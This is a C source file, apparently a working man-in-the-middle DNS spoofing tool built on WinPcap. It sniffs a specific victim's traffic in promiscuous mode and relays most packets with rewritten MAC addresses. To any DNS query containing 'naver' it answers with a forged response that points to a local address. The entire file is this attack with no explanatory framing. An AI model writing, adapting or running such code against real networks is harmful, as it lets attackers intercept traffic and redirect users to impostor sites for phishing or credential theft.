#define _CRT_SECURE_NO_WARNINGS
#include<WinSock2.h>
#include<pcap.h>
#include<stdio.h>
#include<stdint.h>
#include<string.h>

#define ETH_LEN 6
#define IP_LEN 4

#pragma pack(push, 1)
struct ether_header {
	uint8_t dst_host[ETH_LEN];
	uint8_t src_host[ETH_LEN];
	uint16_t ether_type;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct ipv4_header
{
	uint8_t version : 4;
	uint8_t header_len : 4;
	uint8_t DSF;
	uint16_t t_length;
	uint16_t id;
	uint16_t flag;
	uint8_t time;
	uint8_t protocol;
	uint16_t checksum;
	uint8_t src_ip[IP_LEN];
	uint8_t dst_ip[IP_LEN];
};
#pragma pack(pop)

#pragma pack(push, 1)
struct udp_header {
	uint16_t src_port;
	uint16_t dst_port;
	uint16_t udplen;
	uint16_t checksum;
};
#pragma pack(pop)

#pragma pack(push,1)
struct dns_header {
	uint16_t id;
	uint16_t flag;
	uint16_t que;
	uint16_t ans;
	uint16_t aut;
	uint16_t add;
};
#pragma pack(pop)

#pragma pack(push,1)

struct dns_que {
	uint16_t qtype;
	uint16_t qclass;
};
#pragma pack(pop)


#pragma pack(push,1)

struct dns_ans {
	uint16_t name;
	uint16_t atype;
	uint16_t aclass;
	uint32_t ttl;
	uint16_t adatalen;
	uint8_t addr[IP_LEN];
};
#pragma pack(pop)


int main(void)
{
	pcap_if_t* alldevs;
	pcap_if_t* d;
	int inum;
	int i = 0;
	pcap_t* adhandle;
	int res;
	char errbuf[PCAP_ERRBUF_SIZE];


	struct pcap_pkthdr* header;
	const u_char* pkt_data;


	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	for (d = alldevs; d != NULL; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);


	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	if ((adhandle = pcap_open(d->name,
		65536,

		PCAP_OPENFLAG_PROMISCUOUS,
		1000,
		NULL,
		errbuf
	)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		pcap_freealldevs(alldevs);
		return -1;
	}



	printf("\nlistening on %s...\n", d->description);


	pcap_freealldevs(alldevs);




	while (1) {
		res = pcap_next_ex(adhandle, &header, &pkt_data);
		if (res == 0)
			continue;

		struct ether_header* eh;
		struct ipv4_header* ih;
		struct udp_header* uh;
		struct dns_header* dh;

		u_char* name;
		u_int ethlen = 0;

		eh = (struct ether_header*)pkt_data;
		ethlen += sizeof(struct ether_header);
		if (eh->src_host[0] == 0xd4 &&
			eh->src_host[1] == 0xbe &&
			eh->src_host[2] == 0xd9 &&
			eh->src_host[3] == 0x92 &&
			eh->src_host[4] == 0x38 &&
			eh->src_host[5] == 0x1f)
		{
			ih = (struct ipv4_header*)(pkt_data + ethlen);
			ethlen += sizeof(struct ipv4_header);

			if (eh->ether_type == ntohs(0x0800))
			{
				if (ih->dst_ip[0] != 192 ||
					ih->dst_ip[1] != 168 ||
					ih->dst_ip[2] != 42 ||
					ih->dst_ip[3] != 5)
				{

					if (ih->protocol == 0x11)
					{
						uh = (struct udp_header*)(pkt_data + ethlen);
						ethlen += sizeof(struct udp_header);


						if (ntohs(uh->dst_port) == 53)
						{

							dh = (struct dns_header*)(pkt_data + ethlen);
							ethlen += sizeof(struct dns_header);
							name = (pkt_data + ethlen);
							ethlen += sizeof(uint8_t);

							printf("%s\n", name);

							if (strstr(name, "naver"))
							{
								uint8_t temp[IP_LEN];
								uint16_t temp_port;

								eh->dst_host[0] = 0xd4;
								eh->dst_host[1] = 0xbe;
								eh->dst_host[2] = 0xd9;
								eh->dst_host[3] = 0x92;
								eh->dst_host[4] = 0x38;
								eh->dst_host[5] = 0x1f;

								eh->src_host[0] = 0x88;
								eh->src_host[1] = 0x36;
								eh->src_host[2] = 0x6c;
								eh->src_host[3] = 0x7a;
								eh->src_host[4] = 0x56;
								eh->src_host[5] = 0x40;

								/*eh->src_host[0] = 0xd4;
								eh->src_host[1] = 0xbe;
								eh->src_host[2] = 0xd9;
								eh->src_host[3] = 0x92;
								eh->src_host[4] = 0x38;
								eh->src_host[5] = 0x1f;

								eh->dst_host[0] = 0x88;
								eh->dst_host[1] = 0x36;
								eh->dst_host[2] = 0x6c;
								eh->dst_host[3] = 0x7a;
								eh->dst_host[4] = 0x56;
								eh->dst_host[5] = 0x40;*/

								temp[0] = ih->src_ip[0];
								temp[1] = ih->src_ip[1];
								temp[2] = ih->src_ip[2];
								temp[3] = ih->src_ip[3];

								ih->src_ip[0] = ih->dst_ip[0];
								ih->src_ip[1] = ih->dst_ip[1];
								ih->src_ip[2] = ih->dst_ip[2];
								ih->src_ip[3] = ih->dst_ip[3];

								ih->dst_ip[0] = temp[0];
								ih->dst_ip[1] = temp[1];
								ih->dst_ip[2] = temp[2];
								ih->dst_ip[3] = temp[3];


								temp_port = uh->src_port;
								uh->src_port = uh->dst_port;
								uh->dst_port = temp_port;

								struct dns_que dqh;
								struct dns_ans anh;
								



								dh->flag = htons(0x8180);
								dh->que = htons(0x0001);
								dh->ans = htons(0x0001);
								dh->aut = htons(0x0000);
								dh->add = htons(0x0000);

								dqh.qclass = htons(0x0001);
								dqh.qtype = htons(0x0001);


								anh.name = htons(0xc00c);
								anh.atype = htons(0x0001);
								anh.aclass = htons(0x0001);
								anh.ttl = htonl(0x0000000e);
								anh.adatalen = htons(0x0004);
								anh.addr[0] = 192;
								anh.addr[1] = 168;
								anh.addr[2] = 42;
								anh.addr[3] = 16;

								ih->t_length = htons(sizeof(*ih) + sizeof(*uh) + sizeof(*dh) + strlen((char*)name) + sizeof(dqh) + sizeof(anh) + 1);
								uh->udplen = htons(sizeof(*uh) + sizeof(*dh) + strlen((char*)name) + sizeof(dqh) + sizeof(anh) + 1);

								u_int datalen = 0;
								uint8_t add = NULL;
								uint8_t packet[2500] = { 0 };

								printf("гою╖\n");

								memcpy(packet, eh, sizeof(*eh));
								datalen += sizeof(*eh);
								memcpy(packet + datalen, ih, sizeof(*ih));
								datalen += sizeof(*ih);
								memcpy(packet + datalen, uh, sizeof(*uh));
								datalen += sizeof(*uh);
								memcpy(packet + datalen, dh, sizeof(*dh));
								datalen += sizeof(*dh);
								memcpy(packet + datalen, name, strlen(name));
								datalen += strlen(name);
								memcpy(packet + datalen, &add, 1);
								datalen += 1;
								memcpy(packet + datalen, &dqh, sizeof(dqh));
								datalen += sizeof(dqh);
								memcpy(packet + datalen, &anh, sizeof(anh));
								datalen += sizeof(anh);

								pcap_sendpacket(adhandle, packet, datalen);


							}
							else
							{
								eh->dst_host[0] = 0x88;
								eh->dst_host[1] = 0x36;
								eh->dst_host[2] = 0x6c;
								eh->dst_host[3] = 0x7a;
								eh->dst_host[4] = 0x56;
								eh->dst_host[5] = 0x40;

								eh->src_host[0] = 0x00;
								eh->src_host[1] = 0xd8;
								eh->src_host[2] = 0x61;
								eh->src_host[3] = 0x36;
								eh->src_host[4] = 0x39;
								eh->src_host[5] = 0x28;


								uint8_t packet[2500] = { 0 };

								memcpy(packet, eh, sizeof(*eh));
								memcpy(packet + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

								pcap_sendpacket(adhandle, packet, header->len);
							}

						}
						else
						{
						eh->dst_host[0] = 0x88;
						eh->dst_host[1] = 0x36;
						eh->dst_host[2] = 0x6c;
						eh->dst_host[3] = 0x7a;
						eh->dst_host[4] = 0x56;
						eh->dst_host[5] = 0x40;

						eh->src_host[0] = 0x00;
						eh->src_host[1] = 0xd8;
						eh->src_host[2] = 0x61;
						eh->src_host[3] = 0x36;
						eh->src_host[4] = 0x39;
						eh->src_host[5] = 0x28;


						uint8_t packet[2500] = { 0 };

						memcpy(packet, eh, sizeof(*eh));
						memcpy(packet + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

						pcap_sendpacket(adhandle, packet, header->len);
						}

					}
					else
					{
					eh->dst_host[0] = 0x88;
					eh->dst_host[1] = 0x36;
					eh->dst_host[2] = 0x6c;
					eh->dst_host[3] = 0x7a;
					eh->dst_host[4] = 0x56;
					eh->dst_host[5] = 0x40;

					eh->src_host[0] = 0x00;
					eh->src_host[1] = 0xd8;
					eh->src_host[2] = 0x61;
					eh->src_host[3] = 0x36;
					eh->src_host[4] = 0x39;
					eh->src_host[5] = 0x28;


					uint8_t packet[2500] = { 0 };

					memcpy(packet, eh, sizeof(*eh));
					memcpy(packet + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

					pcap_sendpacket(adhandle, packet, header->len);
					}
				}
				else
					{
					eh->dst_host[0] = 0x88;
					eh->dst_host[1] = 0x36;
					eh->dst_host[2] = 0x6c;
					eh->dst_host[3] = 0x7a;
					eh->dst_host[4] = 0x56;
					eh->dst_host[5] = 0x40;

					eh->src_host[0] = 0x00;
					eh->src_host[1] = 0xd8;
					eh->src_host[2] = 0x61;
					eh->src_host[3] = 0x36;
					eh->src_host[4] = 0x39;
					eh->src_host[5] = 0x28;


					uint8_t packet[2500] = { 0 };

					memcpy(packet, eh, sizeof(*eh));
					memcpy(packet + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

					pcap_sendpacket(adhandle, packet, header->len);
					}
			}
		}


		if (res == -1) {
			printf("Error reading the packets: %s\n", pcap_geterr(adhandle));
			return -1;
		}
	}
	return 0;
}